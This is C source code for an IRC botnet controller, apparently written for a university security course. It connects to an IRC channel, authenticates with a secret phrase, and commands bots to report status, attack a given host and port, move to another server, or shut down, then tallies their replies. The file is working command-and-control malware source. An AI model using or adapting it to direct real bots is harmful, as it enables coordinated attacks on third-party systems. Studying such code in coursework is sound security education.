
/*
 * CPSC 526 Assignment 6
 * Geordie Tait
 * 10013837
 * T02
 *
 * IRC Botnet Controller
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>
#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <getopt.h>
#include <time.h>

#define BUFSIZE 1024    // buffer size
#define MAXBOTS 65535   // maximum number of bots
#define ID_LEN 1        // length of alphanumeric identifier in nick
#define CONN_TIMEOUT 5  // connection timeout
#define ACT_TIMEOUT 2   // action timeout

// global variables
struct {
    int countingStatus, botcount;               // status vars
    int countingAttack, successes, failures;    // attack vars
    int countingMoved, moved;                   // move vars
    int countingKilled, killed;                 // shutdown vars
    long statusTime, attackTime, movedTime, killedTime;
    char nicks[MAXBOTS][64], killedNicks[MAXBOTS][64];
    char nick[32];
    char buffer[BUFSIZE];  // temporary buffer for input
    char outbuf[BUFSIZE];  // buffer for output
} globals;

// report error message & exit
void die( const char * errorMessage, ...) {
    fprintf( stderr, "\nError: ");
    va_list args;
    va_start( args, errorMessage);
    vfprintf( stderr, errorMessage, args);
    fprintf( stderr, "\n");
    va_end( args);
    exit(-1);
}

// read a line of text from file descriptor into provided buffer, up to provided char limit
int readLineFromFd( int fd, char * buff, int max) {
    char * ptr = buff;
    int count = 0;
    int result = 1;
    
    while (1) {

        // try to read in the next character from fd, exit loop on failure
        if (read(fd, ptr, 1) < 0) {
            result = -1;
            break;
        }

        // character stored, now advance ptr and character count
        ptr ++;
        count++;

        // if last character read was a newline, exit loop
        if (*(ptr - 1) == '\n') break;

        // if the buffer capacity is reached, exit loop
        if (count >= max - 1) break;        
    }
    
    // rewind ptr to the last read character
    ptr --;

    // trim trailing spaces (including new lines, telnet's \r's)
    while (ptr > buff && isspace(*ptr)) {
        ptr--;
    }

    // terminate the string
    * (ptr + 1) = '\0';
    
    return result;
}

// check beginning of a string
int beginsWith(char *str, char *prefix) {

    int i;
    for (i = 0; i < strlen(prefix); i++) {
        if (prefix[i] != str[i])
            return 0;
    }
    return 1;
}

// generate a string of random alphanumeric characters
void getRandomStr(char *out, size_t n) {
    char chars[] = "0123456789"
                     "abcdefghijklmnopqrstuvwxyz"
                     "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    srand(time(NULL));
    while (n-- > 0) {
        size_t index = (double) rand() / RAND_MAX * (sizeof(chars) - 1);
        *out++ = chars[index];
    }
    *out = 0;
}

// send a message to a given target on the IRC server
int ircMessage(int ircSockFd, char *target, char *msg) {

    bzero(globals.buffer, BUFSIZE);
    sprintf(globals.buffer, "PRIVMSG %s :%s\r\n", target, msg);
    if (write(ircSockFd, globals.buffer, strlen(globals.buffer)) < 0)
        return 0;

    return 1;
}

// perform an action based on user input
int performAction(int ircSockFd, char *channel, char *act) {

    // status
    if (beginsWith(act, "status")) {

        // start counting responses
        globals.statusTime = clock() / CLOCKS_PER_SEC;
        globals.countingStatus = 1;
        globals.botcount = 0;

        // send IRC message to channel
        if (ircMessage(ircSockFd, channel, "HEY BRO") == 0)
            return 0;
    }

    // attack
    else if (beginsWith(act, "attack")) {

        // parse command
        char *cmd, *host, *portstr;
        cmd = strtok(act, " ");
        host = strtok(NULL, " ");
        portstr = strtok(NULL, " ");

        // if invalid
        if (cmd == NULL || host == NULL || portstr == NULL) {
            printf("\nUsage: attack [host] [port]\n");
        }

        // if valid
        else {
            // start counting responses
            globals.attackTime = clock() / CLOCKS_PER_SEC;
            globals.countingAttack = 1;
            globals.successes = 0;
            globals.failures = 0;

            // send IRC message to channel
            char msg[128];
            sprintf(msg, "DO %s %s", host, portstr);
            if (ircMessage(ircSockFd, channel, msg) == 0)
                return 0;
        }
    }

    // move
    else if (beginsWith(act, "move")) {

        // parse command
        char *cmd, *host, *portstr, *chan;
        cmd = strtok(act, " ");
        host = strtok(NULL, " ");
        portstr = strtok(NULL, " ");
        chan = strtok(NULL, " ");

        // if invalid
        if (cmd == NULL || host == NULL
                || portstr == NULL || chan == NULL) {
            printf("\nUsage: move [host] [port] [channel]\n");
        }

        // if valid
        else {
            // start counting responses
            globals.movedTime = clock() / CLOCKS_PER_SEC;
            globals.countingMoved = 1;
            globals.moved = 0;

            // send IRC message to channel
            char msg[256];
            sprintf(msg, "BOOGIE %s %s %s", host, portstr, chan);
            if (ircMessage(ircSockFd, channel, msg) == 0)
                return 0;
        }
    }

    // shutdown
    else if (beginsWith(act, "shutdown")) {

        // start counting responses
        globals.killedTime = clock() / CLOCKS_PER_SEC;
        globals.countingKilled = 1;
        globals.killed = 0;

        // send IRC message to channel
        if (ircMessage(ircSockFd, channel, "PEACE OUT") == 0)
            return 0;
    }

    // quit
    else if (beginsWith(act, "quit")) {
        printf("\nTerminating.\n");
        exit(0);
    }

    else
        printf("\nInvalid command.");

    return 1;
}

// handle responses from bots
int processResponses(int ircSockFd) {

    // read lines from the IRC server
    int n, wrote = 0;
    do {
        bzero(globals.buffer, BUFSIZE);
        n = readLineFromFd(ircSockFd, globals.buffer, BUFSIZE);
        if (write(ircSockFd, globals.outbuf, 1) < 1) return 0;

        // parse lines
        if (n > 0) {

            char *userstr, *cmd, *rest1, *rest2;
            userstr = strtok(globals.buffer, " ");
            cmd = strtok(NULL, " ");
            rest1 = strtok(NULL, " ");
            rest2 = strtok(NULL, "\r\n");

            // skip invalid lines
            if (userstr == NULL
                    || cmd == NULL
                    || rest1 == NULL
                    || rest2 == NULL)
                continue;

            // skip if not PRIVMSG
            if (strcmp(cmd, "PRIVMSG") != 0)
                continue;

            // parse username
            char usertmp[32], *username;
            strcpy(usertmp, userstr);
            username = strtok(usertmp, "!");
            *(username)++;

            // process response messages
            *(rest2)++;
            
            // bot status message
            if (beginsWith(rest2, "SUH DUDE?")) {
                if (globals.countingStatus) {
                    strcpy(globals.nicks[globals.botcount], username);
                    globals.botcount++;
                }
            }

            // attack status message
            else if (beginsWith(rest2, "ATTACK FAILED")) {
                printf("\n%s: attack failed, could not connect to host", username);
                if (globals.countingAttack != 0) {
                    globals.failures++;
                }
                wrote = 1;
            }

            // attack status message
            else if (beginsWith(rest2, "ATTACK SUCCESSFUL")) {
                printf("\n%s: attack successful", username);
                if (globals.countingAttack != 0) {
                    globals.successes++;
                }
                wrote = 1;
            }

            // move status message
            else if (beginsWith(rest2, "MOVED")) {
                printf("\n%s: moved", username);
                if (globals.countingMoved != 0) {
                    globals.moved++;
                }
                wrote = 1;
            }

            // shutdown status message
            else if (beginsWith(rest2, "CATCH YOU ON THE FLIPSIDE")) {
                printf("\n%s: shutting down", username);
                if (globals.countingKilled != 0) {
                    strcpy(globals.killedNicks[globals.killed], username);
                    globals.killed++;
                }
                wrote = 1;
            }
        }
    } while (n > 0);

    if (wrote) return 2;
    return 1;
}

// handle user input
int processCommands(int ircSockFd, char *channel, char *phrase) {

    // init variables for select()
    fd_set ircfds, stdfds;
    struct timeval tv;
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    int ircret, stdret;
    int init = 0;
    char secret[128];
    strcpy(secret, phrase);

    // process user commands
    while (1) {

        // check if we have action results to display
        long sec = clock() / CLOCKS_PER_SEC;

        // bot status
        if (globals.countingStatus && sec - globals.statusTime >= ACT_TIMEOUT) {

            globals.countingStatus = 0;
            printf("\nStatus report: %d total bot(s)", globals.botcount);
            for (int i = 0; i < globals.botcount; i++) {
                printf("\n%s", globals.nicks[i]);
            }
            init = 0;
        }

        // bot attack status
        if (globals.countingAttack && sec - globals.attackTime >= ACT_TIMEOUT) {

            globals.countingAttack = 0;
            float rate = 100.0 * (float) globals.successes
                    / (float) (globals.successes + globals.failures);
            printf("\nAttack report:\nSuccesses: %d  Failures: %d  (%.1f%% success rate)",
                    globals.successes, globals.failures, rate);
            init = 0;
        }

        // bot move status
        if (globals.countingMoved && sec - globals.movedTime >= ACT_TIMEOUT) {

            globals.countingMoved = 0;
            printf("\nMove report: %d bot(s) moved", globals.moved);
            init = 0;
        }

        // bot shutdown status
        if (globals.countingKilled && sec - globals.killedTime >= ACT_TIMEOUT) {

            globals.countingKilled = 0;
            printf("\nShutdown report: %d bot(s) killed", globals.killed);
            init = 0;
        }

        // get user input
        if (!init) {
            printf("\ncommand> ");
            fflush(stdout);
            init = 1;
        }
        
        // check if standard input has data to read
        FD_ZERO(&stdfds);
        FD_SET(0, &stdfds);
        stdret = select(1, &stdfds, NULL, NULL, &tv);
        if (stdret < 0) return 0;

        // if there is data to read
        if (stdret > 0) {

            // send the secret phrase to the channel
            if (ircMessage(ircSockFd, channel, secret) == 0)
                return 0;

            // user entered a command
            bzero(globals.buffer, BUFSIZE);
            int n = read(0, globals.buffer, BUFSIZE);
            if (n < 0 || performAction(ircSockFd, channel, globals.buffer) == 0) 
                return 0;
            init = 0;
        }

        // check if IRC server has data to read
        int iof = -1;
        FD_ZERO(&ircfds);
        FD_SET(ircSockFd, &ircfds);
        ircret = select(ircSockFd+1, &ircfds, NULL, NULL, &tv);
        if (ircret < 0) return 0;

        // if there is data to read
        if (ircret > 0 && FD_ISSET(ircSockFd, &ircfds)) {

            if ((iof = fcntl(ircSockFd, F_GETFL, 0)) != -1)
                fcntl(ircSockFd, F_SETFL, iof | O_NONBLOCK);

            // get data from IRC server
            int response = processResponses(ircSockFd);
            if (response == 0)
                return 0;
            else if (response == 2)
                init = 0;
            
            if (iof != -1)
                fcntl(ircSockFd, F_SETFL, iof);
        }
    }
    
    return 1;
}

// handle connection to server
int processConn(char *host, int port, char *channel, char *secret) {

    int ircSockFd;
    struct sockaddr_in destaddr;
    struct hostent *server;

    // open socket for connecting to IRC server
    ircSockFd = socket(AF_INET, SOCK_STREAM, 0);
    if (ircSockFd < 0)
        return 0;

    // get IRC server host
    server = gethostbyname(host);
    if (server == NULL)
        return 0;

    // connect to IRC server
    bzero((char *)&destaddr, sizeof(destaddr));
    destaddr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&destaddr.sin_addr.s_addr, server->h_length);
    destaddr.sin_port = htons(port);
    if (connect(ircSockFd, (struct sockaddr *)&destaddr, sizeof(destaddr)) < 0)
        return 0;

    // loop until we have an unused nick
    //char nickrand[ID_LEN+1];
    int attempt = 0;
    while (1) {

        // generate a nick (initially no identifier)
        sprintf(globals.nick, "con%d", attempt);

        // send NICK message
        bzero(globals.buffer, BUFSIZE);
        sprintf(globals.buffer, "NICK %s\r\n", globals.nick);
        if (write(ircSockFd, globals.buffer, strlen(globals.buffer)) < 1)
            return 0;

        // send USER message
        bzero(globals.buffer, BUFSIZE);
        sprintf(globals.buffer, "USER %s * * :Con %d\r\n", globals.nick, attempt);
        if (write(ircSockFd, globals.buffer, strlen(globals.buffer)) < 1)
            return 0;

        // receive response
        bzero(globals.buffer, BUFSIZE);
        int n = read(ircSockFd, globals.buffer, BUFSIZE);
        if (n < 1) return 0;

        // check response
        char *host, *code;
        host = strtok(globals.buffer, " ");
        code = strtok(NULL, " ");
        if (code == NULL) return 0;

        if (beginsWith(code, "001"))
            break;
        sleep(1);
        attempt++;
    }

    // join channel
    bzero(globals.buffer, BUFSIZE);
    char chan[64];
    sprintf(chan, "#%s", channel);
    sprintf(globals.buffer, "JOIN %s\r\n", chan);
    if (write(ircSockFd, globals.buffer, strlen(globals.buffer)) < 1)
        return 0;

    // receive response
    bzero(globals.buffer, BUFSIZE);
    int n = read(ircSockFd, globals.buffer, sizeof(globals.buffer));
    if (n < 1) return 0;

    printf("Joined channel %s with nick: %s", chan, globals.nick);

    // begin command processing loop
    if (processCommands(ircSockFd, chan, secret) == 0)
        return 0;

    // clean up and exit
    close(ircSockFd);
    return 1;
}

// print usage
void usage() {
    die( "Usage: ./conbot hostname port channel secret_phrase\n");
}

// main program function (entry point)
int main( int argc, char ** argv) {
    char hostname[32], portstr[8], channel[64], secret[128];
    int port;

    // initialize globals
    globals.countingStatus = 0;
    globals.botcount = 0;
    globals.statusTime = 0;
    globals.countingAttack = 0;
    globals.successes = 0;
    globals.failures = 0;
    globals.attackTime = 0;
    globals.countingMoved = 0;
    globals.moved = 0;
    globals.movedTime = 0;
    globals.countingKilled = 0;
    globals.killed = 0;
    globals.killedTime = 0;

    // parse command line arguments
    if (argc != 5) usage();
    strcpy(hostname, argv[1]);
    strcpy(portstr, argv[2]);
    strcpy(channel, argv[3]);
    strcpy(secret, argv[4]);
    char *end = NULL;
    port = strtol(portstr, &end, 10);

    // check for invalid arguments
    if (*end != 0)
        die("Invalid port: %s", portstr);

    // handle the connection
    while (1) {
        // connect, reconnecting after timeout if connection lost
        if (processConn(hostname, port, channel, secret) == 0) {
            printf("\nConnection failed.");
            sleep(CONN_TIMEOUT);
            printf("\nAttempting to reconnect...");
        }
        else break;
    }

    // clean up and exit
    return 0;
}


